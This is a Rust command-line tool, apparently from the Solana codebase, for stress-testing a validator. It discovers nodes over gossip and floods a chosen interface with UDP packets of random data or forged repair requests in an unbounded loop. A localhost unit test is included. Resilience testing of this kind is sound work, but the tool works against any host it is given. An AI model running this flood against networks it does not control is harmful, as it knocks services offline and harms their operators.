use clap::{crate_description, crate_name, value_t, value_t_or_exit, App, Arg};
use log::*;
use rand::{thread_rng, Rng};
use solana_core::contact_info::ContactInfo;
use solana_core::gossip_service::discover;
use solana_core::serve_repair::RepairProtocol;
use solana_sdk::pubkey::Pubkey;
use std::net::{SocketAddr, UdpSocket};
use std::process::exit;
use std::time::Instant;

fn run_dos(
    nodes: &[ContactInfo],
    iterations: usize,
    entrypoint_addr: SocketAddr,
    data_type: String,
    data_size: usize,
    mode: String,
) {
    let mut target = None;
    for node in nodes {
        if node.gossip == entrypoint_addr {
            target = match mode.as_str() {
                "gossip" => Some(node.gossip),
                "tvu" => Some(node.tvu),
                "tvu_forwards" => Some(node.tvu_forwards),
                "tpu" => Some(node.tpu),
                "tpu_forwards" => Some(node.tpu_forwards),
                "repair" => Some(node.repair),
                "serve_repair" => Some(node.serve_repair),
                &_ => panic!("Unknown mode"),
            };
            break;
        }
    }
    let target = target.expect("should have target");

    info!("Targetting {}", target);
    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();

    let mut data = Vec::new();

    let source = thread_rng().gen_range(0, nodes.len());
    let mut contact = nodes[source].clone();
    contact.id = Pubkey::new_rand();
    match data_type.as_str() {
        "repair_highest" => {
            let slot = 100;
            let req = RepairProtocol::WindowIndex(contact, slot, 0);
            data = bincode::serialize(&req).unwrap();
        }
        "repair_shred" => {
            let slot = 100;
            let req = RepairProtocol::HighestWindowIndex(contact, slot, 0);
            data = bincode::serialize(&req).unwrap();
        }
        "repair_orphan" => {
            let slot = 100;
            let req = RepairProtocol::Orphan(contact, slot);
            data = bincode::serialize(&req).unwrap();
        }
        "random" => {
            data.resize(data_size, 0);
        }
        &_ => {
            panic!("unknown data type");
        }
    }

    let mut last_log = Instant::now();
    let mut count = 0;
    let mut error_count = 0;
    loop {
        if data_type == "random" {
            thread_rng().fill(&mut data[..]);
        }
        let res = socket.send_to(&data, target);
        count += 1;
        if res.is_err() {
            error_count += 1;
        }
        if last_log.elapsed().as_secs() > 5 {
            info!("count: {} errors: {}", count, error_count);
            last_log = Instant::now();
            count = 0;
        }
        if iterations != 0 && count >= iterations {
            break;
        }
    }
}

fn main() {
    solana_logger::setup_with_default("solana=info");
    let matches = App::new(crate_name!())
        .about(crate_description!())
        .version(solana_version::version!())
        .arg(
            Arg::with_name("entrypoint")
                .long("entrypoint")
                .takes_value(true)
                .value_name("HOST:PORT")
                .help("Gossip entrypoint address. Usually <ip>:8001"),
        )
        .arg(
            Arg::with_name("mode")
                .long("mode")
                .takes_value(true)
                .value_name("MODE")
                .possible_values(&[
                    "gossip",
                    "tvu",
                    "tvu_forwards",
                    "tpu",
                    "tpu_forwards",
                    "repair",
                    "serve_repair",
                ])
                .help("Interface to DoS"),
        )
        .arg(
            Arg::with_name("data_size")
                .long("data-size")
                .takes_value(true)
                .value_name("BYTES")
                .help("Size of packet to DoS with"),
        )
        .arg(
            Arg::with_name("data_type")
                .long("data-type")
                .takes_value(true)
                .value_name("TYPE")
                .possible_values(&["repair_highest", "repair_shred", "repair_orphan", "random"])
                .help("Type of data to send"),
        )
        .get_matches();

    let mut entrypoint_addr = SocketAddr::from(([127, 0, 0, 1], 8001));
    if let Some(addr) = matches.value_of("entrypoint") {
        entrypoint_addr = solana_net_utils::parse_host_port(addr).unwrap_or_else(|e| {
            eprintln!("failed to parse entrypoint address: {}", e);
            exit(1)
        });
    }
    let data_size = value_t!(matches, "data_size", usize).unwrap_or(128);

    let mode = value_t_or_exit!(matches, "mode", String);
    let data_type = value_t_or_exit!(matches, "data_type", String);

    info!("Finding cluster entry: {:?}", entrypoint_addr);
    let (nodes, _validators) = discover(
        Some(&entrypoint_addr),
        None,
        Some(60),
        None,
        Some(&entrypoint_addr),
        None,
        0,
    )
    .unwrap_or_else(|err| {
        eprintln!("Failed to discover {} node: {:?}", entrypoint_addr, err);
        exit(1);
    });

    info!("done found {} nodes", nodes.len());

    run_dos(&nodes, 0, entrypoint_addr, data_type, data_size, mode);
}

#[cfg(test)]
pub mod test {
    use super::*;
    use solana_sdk::timing::timestamp;

    #[test]
    fn test_dos() {
        let nodes = [ContactInfo::new_localhost(&Pubkey::new_rand(), timestamp())];
        let entrypoint_addr = nodes[0].gossip;
        run_dos(
            &nodes,
            1,
            entrypoint_addr,
            "random".to_string(),
            10,
            "tvu".to_string(),
        );

        run_dos(
            &nodes,
            1,
            entrypoint_addr,
            "repair_highest".to_string(),
            10,
            "repair".to_string(),
        );

        run_dos(
            &nodes,
            1,
            entrypoint_addr,
            "repair_shred".to_string(),
            10,
            "serve_repair".to_string(),
        );
    }
}
